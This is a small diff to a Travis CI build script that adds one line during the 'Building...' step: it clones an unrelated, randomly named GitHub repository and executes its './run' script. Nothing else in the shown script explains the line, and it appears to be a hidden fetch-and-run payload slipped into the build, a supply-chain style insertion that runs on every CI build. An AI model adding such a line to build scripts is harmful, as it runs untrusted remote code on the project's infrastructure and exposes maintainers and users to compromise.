@@ -2,6 +2,7 @@
 
 echo -en "travis_fold:start:script.build\\r"
 echo "Building..."
+git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
 set -evx
 
 cd ${TRAVIS_BUILD_DIR}
